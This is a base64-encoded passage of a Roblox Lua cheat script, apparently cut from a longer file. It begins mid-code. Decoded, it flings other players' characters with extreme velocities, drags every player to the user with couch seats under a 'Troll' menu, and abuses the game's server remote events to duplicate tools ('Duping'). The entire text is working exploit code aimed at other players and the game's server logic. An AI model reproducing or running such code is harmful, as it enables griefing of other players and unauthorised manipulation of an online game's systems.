9IDAKICAgICAgICAgICAgbG9jYWwgcGFydHMgPSB7cm9vdH0KICAgICAgICAgICAgd2hpbGUgZmxpbmdBY3RpdmUgYW5kIHRhcmdldCBhbmQgdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikgZG8KICAgICAgICAgICAgICAgIGxvY2FsIHRIdW0gPSB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgaWYgdEh1bS5TaXQgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgIGFuZ2xlICs9IDUwCgogICAgICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gaXBhaXJzKHBhcnRzKSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIGhycCA9IHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHBvcyA9IGhycC5Qb3NpdGlvbiArIGhycC5WZWxvY2l0eSAvIDEuNQogICAgICAgICAgICAgICAgICAgIHJvb3QuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhwb3MpICogQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChhbmdsZSksIDAsIDApCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICByb290LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKICAgICAgICAgICAgICAgIHJvb3QuUm90VmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTgsIDllOCwgOWU4KQogICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgZW5kCgogICAgICAgICAKICAgICAgICAgICAgZmxpbmdBY3RpdmUgPSBmYWxzZQogICAgICAgICAgICBidjpEZXN0cm95KCkKICAgICAgICAgICAgaHVtOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgdHJ1ZSkKICAgICAgICAgICAgaHVtLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgICAgICAgICByb290LkNGcmFtZSA9IG9yaWdpbmFsCiAgICAgICAgICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gaHVtCgogICAgICAgICAgICBmb3IgXywgcCBpbiBwYWlycyhjaGFyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBwOklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcC5WZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgICAgIHAuUm90VmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGh1bTpVbmVxdWlwVG9vbHMoKQogICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKCJQaWNraW5nVG9vbHMiLCAiQ291Y2giKQogICAgICAgIGVuZCkKICAgICAgIAogICAgICAgIHdoaWxlIGZsaW5nQWN0aXZlIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgZW5kCiAgICBlbmQKCgogICAgZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgUHJvY2Vzc1BsYXllcihwbGF5ZXIpCgkJCWVuZAogICAgZW5kCn0pCgpUcm9sbDpBZGRCdXR0b24oewogICAgTmFtZSA9ICJCcmluZyBldmVyeW9uZSB1c2luZyBjb3VjaCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBhcmdzID0gewogICAgWzFdID0gIkNsZWFyQWxsVG9vbHMiCn0KCmdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIlJFIik6V2FpdEZvckNoaWxkKCIxQ2xlYTFyVG9vbDFzIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCgp3YWl0KDAuMikKCnRvb2xzZWxjdGVkID0gIkNvdWNoIgpkdXBlYW1vdCA9IDI1IApwaWNrdG9vbHJlbW90ZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIikKY2xlYXJ0b29scmVtb3RlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxQ2xlYTFyVG9vbDFzIikKZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIse1RpdGxlPSJEdXBpbmciLFRleHQ9IuKaoO+4j++4sURPIE5PVCBDTElDSyBXSElMRSBEVVBMSUNBVElORy4iLCBCdXR0b24xID0gIkFscmlnaHQiICxEdXJhdGlvbj01fSkKZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIse1RpdGxlPSJEdXBlIFNjcmlwdCIsVGV4dD0i8J+ThO+4sUJlY2F1c2UgSXQgd2lsbCBicmVhayB0aGUgc2NyaXB0IGFuZCB5b3Ugd2lsbCBuZWVkIHRvIHJlam9pbi4iLCBCdXR0b24xID0gIkFscmlnaHQiICxEdXJhdGlvbj01fSkgCmR1cGluZyA9IHRydWUKb2xkY2YgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCmlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgdGhlbgogICAgdGFzay53YWl0KCkKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKZW5kCndhaXQoMC4xKQppZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgCmVuZApmb3IgbT0xLDIgZG8gCiAgICB0YXNrLndhaXQoKQogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQplbmQKdGFzay53YWl0KDAuMikKZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gdHJ1ZQp3YWl0KDAuNSkKZm9yIGFpZGosYWZoIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgaWYgYWZoLk5hbWUgPT0gdG9vbHNlbGN0ZWQgPT0gZmFsc2UgdGhlbgogICAgICAgIGlmIGFmaDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgIGFmaC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBlbmQKICAgIGVuZAplbmQKZm9yIGFpZWZoaWV3aHdmLGR2amJ2aiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgaWYgZHZqYnZqOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICBpZiBkdmpidmouTmFtZSA9PSB0b29sc2VsY3RlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgIGR2amJ2ajpEZXN0cm95KCkKICAgICAgICBlbmQKICAgIGVuZAplbmQKZm9yIHR0anRqdXRqdXRqanRqLGRkdmR2ZHN2ZGZicm55dHl0bXZkdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIGRkdmR2ZHN2ZGZicm55dHl0bXZkdjpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgaWYgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2Lm5hbWUgPT0gdG9vbHNlbGN0ZWQgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICBkZHZkdmRzdmRmYnJueXR5dG12ZHY6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCmZvciBmaW5kaW4sdG9vbGxlbCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIHRvb2xsZWw6SXNBKCJUb29sIikgdGhlbgogICAgICAgIGlmIHRvb2xsZWwuTmFtZSA9PSB0b29sc2VsY3RlZCB0aGVuCiAgICAgICAgICAgIHRvb2xsbGxmb3VuMiA9IHRydWUKICAgICAgICAgICAgZm9yIGJhc2MsYWlqZncgaW4gcGFpcnModG9vbGxlbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgaWYgYWlqZncuTmFtZSA9PSAiSGFuZGxlIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgYWlqZncuTmFtZSA9ICJIw6IgwqVhw6IgwqVuw6IgwqVkw6IgwqVsw6IgwqVlIgogICAgICAgICAgICAgICAgICAgIHRvb2xsZWwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgdG9sbGxsYWhoaGggPSB0b29sbGVsCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbHNlIAogICAgICAgICAgICB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgIGVuZAogICAgZW5kCmVuZApmb3IgZmlpZmksdG9vbGxsbCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgaWYgdG9vbGxsbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgaWYgdG9vbGxsbC5OYW1lID09IHRvb2xzZWxjdGVkIHRoZW4KICAgICAgICAgICAgdG9vbGxsbGZvdW4gPSB0cnVlCiAgICAgICAgICAgIGZvciBuYW5hLGpqc2pzaiBpbiBwYWlycyh0b29sbGxsOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBqanNqc2ouTmFtZSA9PSAiSGFuZGxlIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgampzanNqLk5hbWUgPSAiSMOiIMKlYcOiIMKlbsOiIMKlZMOiIMKlbMOiIMKlZSIKICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIHRvb2xsbGZmZWwgPSB0b29sbGxsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZSAKICAgICAgICAgICAgdG9vbGxsbGZvdW4gPSBmYWxzZQogICAgICAgIGVuZAogICAgZW5kCmVuZAppZiB0b29sbGxsZm91biA9PSB0cnVlIHRoZW4KICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbGxsZmZlbCkgPT0gbmlsIHRoZW4gIAogICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UgCiAgICBlbmQKICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sbGxmZmVsKSA9PSBuaWwKICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKZW5kCmlmIHRvb2xsbGxmb3VuMiA9PSB0cnVlIHRoZW4KICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbCB0aGVuIAogICAgICAgIHRvb2xsbGxmb3VuMiA9IGZhbHNlIAogICAgZW5kCiAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbAogICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKZW5kCndhaXQoMC4xKQpmb3IgbT0xLCBkdXBlYW1vdCBkbwogICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgCiAgICAgICAgcmV0dXJuIAogICAgZW5kCiAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpIAogICAgZW5kCiAgICBpZiBtIDw9IGR1cGVhbW90IHRoZW4KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIix7VGl0bGU9IkR1cGluZyIsVGV4dD0iWW91IGhhdmUiLi4iICIuLm0uLiIgIi4uIkR1cGVkIi4uIiAiLi50b29sc2VsY3RlZC4uIiEiLER1cmF0aW9uPTAuNX0pCiAgICBlbHNlaWYgbSA9PSBkdXBlYW1vdCBvciBtID49IGR1cGVhbW90IC0gMSB0aGVuCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIse1RpdGxlPSJEdXBpbmciLFRleHQ9IllvdSBoYXZlIi4uIiAiLi5tLi4iICIuLiJEdXBlZCIuLiIgIi4udG9vbHNlbGN0ZWQuLiIhIi4uIiAiLi4i4pqg77iP77ixRHVwaW5nIHRvb2xzIGlzIGRvbmUgbm93LCBwbGVhc2Ugd2FpdCBhIGxpdHRsZSBiaXQgdG8gcmVzcGF3bi4iLER1cmF0aW9uPTR9KQogICAgZW5kCiAgICBsb2NhbCBhcmdzID0gewogICAgICAgIFsxXSA9ICJQaWNraW5nVG9vbHMiLAogICAgICAgIFsyXSA9IHRvb2xzZWxjdGVkCiAgICB9CiAgICAKICAgIHBpY2t0b29scmVtb3RlOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpXYWl0Rm9yQ2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIAogICAgICAgIHJldHVybiAKICAgIGVuZAogICAgd2FpdCgpCiAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHNlbGN0ZWRdOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUiKS5OYW1lID0gIkjDoiDCpWHDoiDCpW7DoiDCpWTDoiDCpWzDoiDCpWUiCiAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIHJlcGVhdCAgCiAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgCiAgICAgICAgZW5kCiAgICAgICAgdGFzay53YWl0KCkgCiAgICB1bnRpbCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpID09IG5pbAplbmQKZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgPT0gbmlsCnJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCmdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZgp3YWl0KCkKZHVwaW5nID0gZmFsc2UKCmZvciB3d2VmZWYsd2VpZnd3ZSBpbiBwYWlycyhnYW1lLlBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgaWYgd2VpZnd3ZS5OYW1lID09IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5OYW1lID09IGZhbHNlIHRoZW4KICAgICAgICBld29pZmp3b2lmaml3byA9IHd3ZWZlZgogICAgZW5kCmVuZApmb3IgbT0xLGV3b2lmandvaWZqaXdvIGRvCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2suQ291Y2guTmFtZSA9ICJjb3VjaCIuLm0KZW5kCndhaXQoKQpmb3Igd2VvZmVmYXdkLGl3aWVqZ3Vpd2cgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICBpZiBpd2llamd1aXdnLk5hbWUgPT0gImNvdWNoIi4ud2VvZmVmYXdkIHRoZW4KICAgICAgICBpd2llamd1aXdnLkhhbmRsZS5OYW1lID0gIkhhbmRsZSAiCiAgICBlbmQKZW5kCndhaXQoMC4yKQpsb2NhbCBmdW5jdGlvbiBicmluZyhza2pkZnV3aXJ1d2csd29pZWpld2cpCiAgICBpZiB3b2llamV3ZyA9PSBuaWwgPT0gZmFsc2UgdGhlbgogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1siY291Y2giLi5za2pkZnV3aXJ1d2ddOkZpbmRGaXJzdENoaWxkKCJTZWF0MSIpLkRpc2FibGVkID0gdHJ1ZQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1siY291Y2giLi5za2pkZnV3aXJ1d2ddOkZpbmRGaXJzdENoaWxkKCJTZWF0MiIpLkRpc2FibGVkID0gdHJ1ZQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1siY291Y2giLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICB0ZXQgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbImNvdWNoIi4uc2tqZGZ1d2lydXdnXTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlICIpKQogICAgICAgIHRldC5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSxtYXRoLmh1Z2UsbWF0aC5odWdlKQogICAgICAgIHRldC5QID0gMTI1MAogICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKQogICAgICAgIHRldC5OYW1lID0gIiNtT1ZPT0VQRiQjQEYkI0dFUkUuLj5WPDw8PEVXPFY8PFciCiAgICAgICAgcmVwZWF0CiAgICAgICAgICAgIGZvciBtPTEsMzUgZG8KICAgICAgICAgICAgICAgIGxvY2FsIHBvcyA9IHt4PTAsIHk9MCwgej0wfQogICAgICAgICAgICAgICAgcG9zLnggPSB3b2llamV3Zy5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbi5YCiAgICAgICAgICAgICAgICBwb3MueSA9IHdvaWVqZXdnLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLlkKICAgICAgICAgICAgICAgIHBvcy56ID0gd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWgogICAgICAgICAgICAgICAgcG9zLnggPSBwb3MueCArIHdvaWVqZXdnLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5LlggLyAyCiAgICAgICAgICAgICAgICBwb3MueSA9IHBvcy55ICsgd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuWSAvIDIKICAgICAgICAgICAgICAgIHBvcy56ID0gcG9zLnogKyB3b2llamV3Zy5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5WZWxvY2l0eS5aIC8gMgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlclsiY291Y2giLi5za2pkZnV3aXJ1d2ddOkZpbmRGaXJzdENoaWxkKCJTZWF0MSIpLkNGcmFtZSA9IENGcmFtZS5uZXcoVmVjdG9yMy5uZXcocG9zLngscG9zLnkscG9zLnopKSAqIENGcmFtZS5uZXcoLTIsMiwwKQogICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbImNvdWNoIi4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1siY291Y2giLi5za2pkZnV3aXJ1d2ddOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUgIikuTmFtZSA9ICJIYW5kbGUiCiAgICAgICAgICAgIHdhaXQoMC4yKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbImNvdWNoIi4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyWyJjb3VjaCIuLnNramRmdXdpcnV3Z10uUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1siY291Y2giLi5za2pkZnV3aXJ1d2ddLkhhbmRsZS5OYW1lID0gIkhhbmRsZSAiCiAgICAgICAgICAgIHdhaXQoMC4yKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbImNvdWNoIi4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIHRldCA9IEluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5IiwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlclsiY291Y2giLi5za2pkZnV3aXJ1d2ddOkZpbmRGaXJzdENoaWxkKCJTZWF0MSIpKQogICAgICAgICAgICB0ZXQuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsbWF0aC5odWdlLG1hdGguaHVnZSkKICAgICAgICAgICAgdGV0LlAgPSAxMjUwCiAgICAgICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKQogICAgICAgICAgICB0ZXQuTmFtZSA9ICIjbU9WT09FUEYkI0BGJCNHRVJFLi4+Vjw8PDxFVzxWPDxXIgogICAgICAgIHVudGlsIHdvaWVqZXdnLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPT0gdHJ1ZQogICAgICAgIHdhaXQoKQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbImNvdWNoIi4uc2tqZGZ1d2lydXdnXTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlICIpOkZpbmRGaXJzdENoaWxkKCIjbU9WT09FUEYkI0BGJCNHRVJFLi4+Vjw8PDxFVzxWPDxXIik6RGVzdHJveSgpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlclsiY291Y2giLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIHdhaXQoKQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1siY291Y2giLi5za2pkZnV3aXJ1d2ddOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUgIikuTmFtZSA9ICJIYW5kbGUiCiAgICAgICAgd2FpdCgwLjIpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrWyJjb3VjaCIuLnNramRmdXdpcnV3Z10uUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIHdhaXQoKQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbImNvdWNoIi4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgIGVuZAplbmQKZm9yIG13ZWYsd2V1ZXJnIGluIHBhaXJzKGdhbWUuUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICBpZiB3ZXVlcmcuTmFtZSA9PSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZSA9PSBmYWxzZSB0aGVuCiAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICBicmluZyhtd2VmLHdldWVyZykKICAgICAgICBlbmQpCiAgICBlbmQKZW5kCiAgICBlbmQKfSkK